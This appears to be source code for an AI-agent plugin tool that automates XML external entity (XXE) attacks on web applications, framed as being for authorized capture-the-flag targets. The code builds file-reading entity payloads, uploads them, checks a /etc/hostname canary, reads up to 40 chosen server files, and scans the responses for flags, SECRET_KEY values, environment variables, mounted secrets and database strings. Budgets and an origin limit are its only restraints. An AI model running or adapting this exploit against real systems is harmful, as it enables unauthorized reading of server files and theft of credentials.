import { tool } from "@opencode-ai/plugin"
import { CtfRequestBudget, BudgetStopError, writeProbeEvidence } from "../lib/ctf-request-budget.ts"
import { directoryFromContext } from "../lib/workspace-path.ts"
import { normalizeUrl } from "../lib/web-http.ts"

function replaceAll(template: string, values: Record<string, string>) {
  return Object.entries(values).reduce((text, [key, value]) => text.replaceAll(`{${key}}`, value), template)
}
function safeSlug(value: string) {
  return (
    value
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-|-$/g, "")
      .slice(0, 60) || "xxe-closure"
  )
}
function xmlEntity(file: string, root = "ctf") {
  const escaped = file.replace(/\\/g, "/").replace(/"/g, "%22")
  return `<?xml version="1.0"?><!DOCTYPE ${root} [<!ENTITY xxe SYSTEM "file://${escaped}">]><${root}>&xxe;</${root}>`
}
function parseJsonObject(raw: string | undefined, label: string): Record<string, string> {
  if (!raw?.trim()) return {}
  const value = JSON.parse(raw)
  if (!value || typeof value !== "object" || Array.isArray(value)) throw new Error(`${label} must be a JSON object`)
  return Object.fromEntries(
    Object.entries(value)
      .filter(([, item]) => ["string", "number", "boolean"].includes(typeof item))
      .map(([key, item]) => [key, String(item)]),
  )
}
function inferStored(text: string, filename: string): string {
  if (text.includes(filename)) return filename
  const candidates = [
    ...Array.from(
      text.matchAll(/(?:stored|filename|file|path|upload)[^\n"']{0,80}[=:/>"']+([^\s"'<>]{2,180})/gi),
      (m) => m[1],
    ),
    ...Array.from(text.matchAll(/(?:preview|uploaded)[\/?]([^\s"'<>]{2,180})/gi), (m) => m[1]),
  ]
  return candidates.find((item) => !/^https?:/i.test(item)) || filename
}
function classify(text: string, status: number, target: string) {
  const normalized = text.replace(/\s+/g, " ").slice(0, 2_000)
  if (status === 404) return { state: "file_or_preview_not_found", reason: "HTTP 404" }
  if (
    /entity\s+['"]?xxe|doctype|external entity|xml parsing disabled|forbidden/i.test(normalized) &&
    !/\b(?:FLAG|flag|SECRET_KEY|\/run\/secrets)\b/.test(normalized)
  ) {
    return { state: "xxe_blocked_or_parser_error", reason: normalized.slice(0, 500) }
  }
  if (/StartTag|invalid element name|not well-formed|parseerror|syntaxerror|traceback/i.test(normalized)) {
    return {
      state: "read_success_parse_conflict",
      reason: "file content reached an XML/parser boundary",
      parser_error: normalized.slice(0, 500),
    }
  }
  if (text.trim() && !/&xxe;/.test(text))
    return { state: "read_success", reason: `preview returned content for ${target}` }
  return { state: "no_confirmed_read", reason: normalized.slice(0, 500) || "empty response" }
}
function extractKeywords(text: string) {
  const patterns = [
    /FLAG\s*[:=]\s*[^\s,;]+/gi,
    /flag\s*[:=]\s*[^\s,;]+/g,
    /open\s*\([^\n]{0,180}/gi,
    /os\.environ[^\n]{0,180}/gi,
    /SECRET_KEY[^\n]{0,180}/gi,
    /\/run\/secrets[^\n]{0,180}/gi,
    /kubernetes|k8s|secret(?:s)?\/[A-Za-z0-9._-]+/gi,
    /(?:sqlite|postgres|mysql|mongodb)[^\n]{0,160}/gi,
  ]
  return [
    ...new Set(
      patterns.flatMap((pattern) => Array.from(text.matchAll(pattern), (match) => match[0].trim()).filter(Boolean)),
    ),
  ].slice(0, 80)
}
function inferTraceback(text: string) {
  const files = [...text.matchAll(/(?:File|file)\s+["']([^"']+)["']\s*,?\s*line\s+(\d+)/gi)].map((m) => ({
    file: m[1],
    line: Number(m[2]),
  }))
  const cwd = text.match(/(?:cwd|working directory|current directory)\s*[:=]\s*([^\s<]+)/i)?.[1]
  return { files, cwd }
}

export default tool({
  description:
    "Bounded XXE closure for authorized CTF web targets: optional login, multipart upload, canary verification, preview discovery, low-frequency local-file reads, parser-conflict classification, traceback/source-path inference, keyword extraction, budgets, and evidence packets.",
  args: {
    baseUrl: tool.schema.string(),
    sessionCookie: tool.schema.string().optional(),
    reuseSession: tool.schema
      .boolean()
      .optional()
      .describe("Reuse the session cookie and Set-Cookie values across bounded requests; default true"),
    loginPath: tool.schema.string().optional(),
    loginFieldsJson: tool.schema.string().optional().describe("JSON form fields for an optional login POST"),
    uploadPath: tool.schema.string(),
    previewPattern: tool.schema.string().describe("Preview URL template containing {stored}"),
    field: tool.schema.string().default("file"),
    targetFiles: tool.schema.array(tool.schema.string()).min(1).max(40),
    filenamePrefix: tool.schema.string().optional(),
    canaryFile: tool.schema.string().optional().describe("Canary local file, default /etc/hostname"),
    chunkSize: tool.schema.number().optional().describe("Source chunk hint recorded in evidence; default 4096"),
    maxChunks: tool.schema.number().optional().describe("Maximum source-file targets/attempts, default 12"),
    maxRequests: tool.schema.number().optional(),
    maxStateChangingRequests: tool.schema.number().optional(),
    minIntervalMs: tool.schema.number().optional(),
    timeoutMs: tool.schema.number().optional(),
    challenge: tool.schema.string().optional(),
  },
  async execute(args, context) {
    const directory = directoryFromContext(context)
    const base = new URL(normalizeUrl(args.baseUrl))
    const loginFields = parseJsonObject(args.loginFieldsJson, "loginFieldsJson")
    const budget = new CtfRequestBudget(
      {
        maxRequests: args.maxRequests,
        maxStateChangingRequests: args.maxStateChangingRequests,
        minIntervalMs: args.minIntervalMs,
        timeoutMs: args.timeoutMs,
        stopOnConnectionReset: true,
        reuseSession: args.reuseSession ?? true,
        allowedOrigin: base.origin,
      },
      args.sessionCookie,
    )
    const observations: Array<Record<string, unknown>> = []
    const reads: Array<Record<string, unknown>> = []
    let xxeVerified = false
    let stopReason: string | undefined
    const prefix = args.filenamePrefix || `ctf-xxe-${Date.now().toString(36)}`

    try {
      if (args.loginPath) {
        const login = await budget.request(
          new URL(args.loginPath, base),
          {
            method: "POST",
            headers: { "content-type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams(loginFields).toString(),
          },
          true,
          "login",
        )
        observations.push({ ...login.observation })
      }

      const canaryFile = args.canaryFile || "/etc/hostname"
      const canaryName = `${prefix}-canary.xml`
      const canaryUpload = new FormData()
      canaryUpload.append(args.field, new Blob([xmlEntity(canaryFile)], { type: "application/xml" }), canaryName)
      const canaryResponse = await budget.request(
        new URL(args.uploadPath, base),
        { method: "POST", body: canaryUpload },
        true,
        "upload-canary",
      )
      observations.push({ ...canaryResponse.observation })
      const canaryStored = inferStored(canaryResponse.text, canaryName)
      const canaryPreview = await budget.request(
        new URL(replaceAll(args.previewPattern, { stored: canaryStored, filename: canaryStored }), base),
        {},
        false,
        "preview-canary",
      )
      observations.push({ ...canaryPreview.observation })
      const canaryClass = classify(canaryPreview.text, canaryPreview.observation.status || 0, canaryFile)
      xxeVerified = canaryClass.state === "read_success" || canaryClass.state === "read_success_parse_conflict"
      reads.push({
        target: canaryFile,
        stored: canaryStored,
        ...canaryClass,
        snippet: canaryPreview.text.slice(0, 1_000),
        keywords: extractKeywords(canaryPreview.text),
      })

      const targets = args.targetFiles.slice(0, Math.max(1, Math.min(Math.floor(args.maxChunks ?? 12), 40)))
      for (const [index, target] of targets.entries()) {
        const filename = `${prefix}-${String(index + 1).padStart(2, "0")}.xml`
        const form = new FormData()
        form.append(args.field, new Blob([xmlEntity(target)], { type: "application/xml" }), filename)
        const uploaded = await budget.request(
          new URL(args.uploadPath, base),
          { method: "POST", body: form },
          true,
          `upload-${index + 1}`,
        )
        observations.push({ ...uploaded.observation })
        const stored = inferStored(uploaded.text, filename)
        const preview = await budget.request(
          new URL(replaceAll(args.previewPattern, { stored, filename }), base),
          {},
          false,
          `preview-${index + 1}`,
        )
        observations.push({ ...preview.observation })
        const classification = classify(preview.text, preview.observation.status || 0, target)
        const trace = inferTraceback(preview.text)
        reads.push({
          target,
          stored,
          ...classification,
          traceback: trace,
          snippet: preview.text.slice(0, 4_000),
          keywords: extractKeywords(preview.text),
        })
      }
    } catch (error) {
      stopReason =
        error instanceof BudgetStopError
          ? `${error.code}: ${error.message}`
          : error instanceof Error
            ? error.message
            : String(error)
    }

    const allText = reads.map((item) => String(item.snippet || "")).join("\n")
    const sourceHints = [
      ...new Set(
        reads.flatMap(
          (item) => (item.traceback as { files?: Array<{ file: string; line: number }> } | undefined)?.files || [],
        ),
      ),
    ]
    const payload = {
      tool: "ctf-web-xxe-closure",
      target: base.toString(),
      requests: budget.requests,
      state_changing_requests: budget.stateChangingRequests,
      observations: budget.observations,
      confirmed_primitives: xxeVerified ? ["XXE", "local_file_read"] : [],
      xxe_verified: xxeVerified,
      reads,
      source_hints: sourceHints,
      keyword_hits: extractKeywords(allText),
      chunk_plan: {
        chunkSize: Math.max(512, Math.min(Math.floor(args.chunkSize ?? 4096), 64_000)),
        maxChunks: args.maxChunks ?? 12,
        mode: "target-per-upload",
        executed: false,
        note: "Generic XXE cannot safely slice arbitrary source files server-side. Each bounded target is uploaded once; parser conflicts are preserved as evidence rather than mislabeled as completed source chunk reads.",
      },
      route_state: budget.routeState,
      stop_reason: stopReason,
      next_probe: stopReason
        ? "resume with a larger bounded budget only after reviewing the last response"
        : xxeVerified
          ? "read inferred source/config paths at low frequency and verify a flag through an independent route"
          : "inspect upload/preview response and parser errors before trying another entity form",
    }
    const evidenceRef = await writeProbeEvidence(directory, args.challenge || safeSlug(base.host), payload)
    return JSON.stringify({ ...payload, evidence_ref: evidenceRef }, null, 2)
  },
})
